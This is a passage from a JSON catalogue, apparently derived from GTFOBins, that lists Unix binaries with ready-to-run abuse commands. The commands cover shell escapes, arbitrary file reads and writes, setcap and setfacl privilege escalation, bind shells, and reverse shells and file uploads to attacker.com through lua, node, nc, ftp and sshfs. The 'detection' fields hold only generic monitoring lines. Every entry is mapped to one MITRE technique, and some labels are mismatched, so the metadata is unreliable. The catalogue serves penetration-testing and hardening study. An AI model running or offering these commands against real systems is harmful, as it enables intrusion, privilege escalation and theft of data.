                    "code": "finger DATA@attacker.com"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor finger usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/finger/"
                }
            ]
        },
        {
            "name": "git",
            "description": "Unix binary git.",
            "categories": [
                "file-read",
                "file-write",
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "git diff /dev/null /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "git apply --unsafe-paths --directory / x.patch"
                },
                {
                    "label": "INHERIT: ",
                    "code": "git help config"
                },
                {
                    "label": "INHERIT: ",
                    "code": "git branch --help config\n!/bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "PAGER='/bin/sh -c \"exec sh 0<&1\"' git -p help"
                },
                {
                    "label": "SHELL: ",
                    "code": "git init .\necho 'exec /bin/sh 0<&2 1>&2' >.git/hooks/pre-commit\nchmod +x .git/hooks/pre-commit\ngit -C . commit --allow-empty -m x"
                },
                {
                    "label": "SHELL: ",
                    "code": "ln -s /bin/sh git-x\ngit --exec-path=. x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor git usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/git/"
                }
            ]
        },
        {
            "name": "dc",
            "description": "Unix binary dc.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "dc -e '!/bin/sh'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dc/"
                }
            ]
        },
        {
            "name": "ncftp",
            "description": "Unix binary ncftp.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ncftp\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ncftp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ncftp/"
                }
            ]
        },
        {
            "name": "rev",
            "description": "Unix binary rev.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "rev /path/to/input-file | rev"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor rev usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/rev/"
                }
            ]
        },
        {
            "name": "facter",
            "description": "Unix binary facter.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "FACTERLIB=/path/to/dir/ facter"
                },
                {
                    "label": "INHERIT: ",
                    "code": "facter --custom-dir=/path/to/dir/ x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor facter usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/facter/"
                }
            ]
        },
        {
            "name": "aoss",
            "description": "Unix binary aoss.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "aoss /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor aoss usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/aoss/"
                }
            ]
        },
        {
            "name": "lua",
            "description": "Unix binary lua.",
            "categories": [
                "reverse-shell",
                "execute",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "lua -e '\n  local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",12345));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(\"/path/to/output-file\", \"wb\");\n  f:write(d);\n  io.close(f);'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "lua -e 'local f=io.open(\"/path/to/input-file\", \"rb\"); io.write(f:read(\"*a\")); io.close(f);'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "lua -e 'local f=io.open(\"/path/to/output-file\", \"wb\"); f:write(\"DATA\"); io.close(f);'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "lua -e '\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                },
                {
                    "label": "SHELL: ",
                    "code": "lua -e 'os.execute(\"/bin/sh\")'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "lua -e '\n  local f=io.open(\"/path/to/input-file\", \"rb\")\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(\"attacker.com\",12345);\n  t:send(d);\n  t:close();'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lua usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lua/"
                }
            ]
        },
        {
            "name": "ispell",
            "description": "Unix binary ispell.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ispell /etc/hosts\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ispell usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ispell/"
                }
            ]
        },
        {
            "name": "check_cups",
            "description": "Unix binary check_cups.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "check_cups --extra-opts=@/path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_cups usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_cups/"
                }
            ]
        },
        {
            "name": "ksu",
            "description": "Unix binary ksu.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ksu -q -e /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ksu usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ksu/"
                }
            ]
        },
        {
            "name": "vim",
            "description": "Unix binary vim.",
            "categories": [
                "file-read",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'"
                },
                {
                    "label": "INHERIT: ",
                    "code": "vim -c ':py ...'"
                },
                {
                    "label": "INHERIT: ",
                    "code": "vim -c ':lua ...'"
                },
                {
                    "label": "INHERIT: ",
                    "code": "vim"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor vim usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/vim/"
                }
            ]
        },
        {
            "name": "mail",
            "description": "Unix binary mail.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "mail --exec='!/bin/sh'"
                },
                {
                    "label": "SHELL: ",
                    "code": "mail -f /etc/hosts\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mail usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mail/"
                }
            ]
        },
        {
            "name": "cmake",
            "description": "Unix binary cmake.",
            "categories": [
                "file-read",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "cmake -E cat /path/to/input-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt\ncmake /path/to/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cmake usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cmake/"
                }
            ]
        },
        {
            "name": "cdist",
            "description": "Unix binary cdist.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "cdist shell -s /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cdist usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cdist/"
                }
            ]
        },
        {
            "name": "setcap",
            "description": "Unix binary setcap.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "setcap cap_setuid+ep /path/to/command"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor setcap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/setcap/"
                }
            ]
        },
        {
            "name": "composer",
            "description": "Unix binary composer.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo '{\"scripts\":{\"x\":\"/bin/sh\"}}' >composer.json\ncomposer run-script x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor composer usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/composer/"
                }
            ]
        },
        {
            "name": "logsave",
            "description": "Unix binary logsave.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "logsave /dev/null /bin/sh -i"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor logsave usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/logsave/"
                }
            ]
        },
        {
            "name": "cobc",
            "description": "Unix binary cobc.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file\ncobc -xFj --frelax-syntax-checks /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor cobc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/cobc/"
                }
            ]
        },
        {
            "name": "zless",
            "description": "Unix binary zless.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "zless /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zless usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zless/"
                }
            ]
        },
        {
            "name": "wc",
            "description": "Unix binary wc.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "wc --files0-from /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor wc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/wc/"
                }
            ]
        },
        {
            "name": "node",
            "description": "Unix binary node.",
            "categories": [
                "reverse-shell",
                "execute",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").createServer(function (client) {\n  client.pipe(sh.stdin);\n  sh.stdout.pipe(client);\n  sh.stderr.pipe(client);\n}).listen(12345)'"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "node -e 'require(\"http\").get(\"http://attacker.com/path/to/input-file\", res => res.pipe(require(\"fs\").createWriteStream(\"/path/to/output-file\")))'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/path/to/input-file\"))'"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "node -e 'require(\"fs\").writeFileSync(\"/path/to/output-file\", \"DATA\")'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"
                },
                {
                    "label": "SHELL: ",
                    "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "node -e 'require(\"fs\").createReadStream(\"/path/to/input-file\").pipe(require(\"http\").request(\"http://attacker.com/path/to/output-file\"))'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor node usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/node/"
                }
            ]
        },
        {
            "name": "pyright",
            "description": "Unix binary pyright.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pyright /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "pyright --outputjson /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "pyright -w /path/to/input-dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pyright usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pyright/"
                }
            ]
        },
        {
            "name": "busctl",
            "description": "Unix binary busctl.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "busctl --show-machine"
                },
                {
                    "label": "SHELL: ",
                    "code": "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
                },
                {
                    "label": "SHELL: ",
                    "code": "busctl --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor busctl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/busctl/"
                }
            ]
        },
        {
            "name": "basez",
            "description": "Unix binary basez.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "basez /path/to/input-file | basez --decode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor basez usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/basez/"
                }
            ]
        },
        {
            "name": "timedatectl",
            "description": "Unix binary timedatectl.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "timedatectl list-timezones"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor timedatectl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/timedatectl/"
                }
            ]
        },
        {
            "name": "aa-exec",
            "description": "Unix binary aa-exec.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "aa-exec /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor aa-exec usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/aa-exec/"
                }
            ]
        },
        {
            "name": "ghci",
            "description": "Unix binary ghci.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "ghci\nSystem.Process.callCommand \"/bin/sh\""
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ghci usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ghci/"
                }
            ]
        },
        {
            "name": "poetry",
            "description": "Unix binary poetry.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >/path/to/temp-file\npoetry run python /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor poetry usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/poetry/"
                }
            ]
        },
        {
            "name": "lualatex",
            "description": "Unix binary lualatex.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "lualatex -shell-escape '\\directlua{...}\\end'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lualatex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lualatex/"
                }
            ]
        },
        {
            "name": "ftp",
            "description": "Unix binary ftp.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "ftp -a attacker.com\nget /path/to/input-file output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "ftp\n!/bin/sh"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "ftp -a attacker.com\nput /path/to/input-file output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ftp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ftp/"
                }
            ]
        },
        {
            "name": "w3m",
            "description": "Unix binary w3m.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "w3m -dump /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor w3m usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/w3m/"
                }
            ]
        },
        {
            "name": "apt-get",
            "description": "Unix binary apt-get.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "apt-get changelog apt"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' >/path/to/temp-file\napt-get -y install -c /path/to/temp-file sl"
                },
                {
                    "label": "SHELL: ",
                    "code": "apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor apt-get usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/apt-get/"
                }
            ]
        },
        {
            "name": "R",
            "description": "Unix binary R.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "R --no-save -e 'system(\"/bin/sh\")'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor R usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/R/"
                }
            ]
        },
        {
            "name": "ssh-copy-id",
            "description": "Unix binary ssh-copy-id.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ssh-copy-id usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ssh-copy-id/"
                }
            ]
        },
        {
            "name": "mv",
            "description": "Unix binary mv.",
            "categories": [
                "file-write",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\nmv /path/to/temp-file /path/to/output-file"
                },
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "mv /path/to/input-file /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mv usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mv/"
                }
            ]
        },
        {
            "name": "nmap",
            "description": "Unix binary nmap.",
            "categories": [
                "file-read",
                "file-write",
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "nmap -iL /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "nmap -oG=/path/to/output-file DATA"
                },
                {
                    "label": "INHERIT: ",
                    "code": "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "nmap --interactive\n!/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nmap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nmap/"
                }
            ]
        },
        {
            "name": "head",
            "description": "Unix binary head.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "head -c-0 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor head usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/head/"
                }
            ]
        },
        {
            "name": "nc",
            "description": "Unix binary nc.",
            "categories": [
                "reverse-shell",
                "execute"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "nc -l -p 12345 -e /bin/sh"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "nc -l -p 12345 >/path/to/output-file"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "nc attacker.com 12345 >/path/to/output-file"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "nc -e /bin/sh attacker.com 12345"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "nc -l -p 12345 </path/to/input-file"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "nc attacker.com 12345 </path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor nc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/nc/"
                }
            ]
        },
        {
            "name": "terraform",
            "description": "Unix binary terraform.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "terraform console\nfile(\"/path/to/input-file\")"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor terraform usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/terraform/"
                }
            ]
        },
        {
            "name": "sshfs",
            "description": "Unix binary sshfs.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "sshfs -o ssh_command=/path/to/command x: /path/to/dir/"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/dir/path/to/input-file /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file\nchmod +x /path/to/temp-file\nsshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/input-file /path/to/dir/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sshfs usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sshfs/"
                }
            ]
        },
        {
            "name": "setfacl",
            "description": "Unix binary setfacl.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "setfacl -m u:$(id -un):rwx /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor setfacl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/setfacl/"
                }
            ]
        },
        {
            "name": "setarch",
            "description": "Unix binary setarch.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "setarch -3 /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor setarch usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/setarch/"
                }
            ]
        },
        {
            "name": "watch",
            "description": "Unix binary watch.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "watch -x /bin/sh -c 'reset; exec /bin/sh 1>&0 2>&0'"
                },
                {
                    "label": "SHELL: ",
                    "code": "watch 'reset; exec /bin/sh 1>&0 2>&0'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor watch usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/watch/"
                }
            ]
        },
        {
            "name": "plymouth",
            "description": "Unix binary plymouth.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "plymouth ask-for-password --prompt=x --command=/bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor plymouth usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
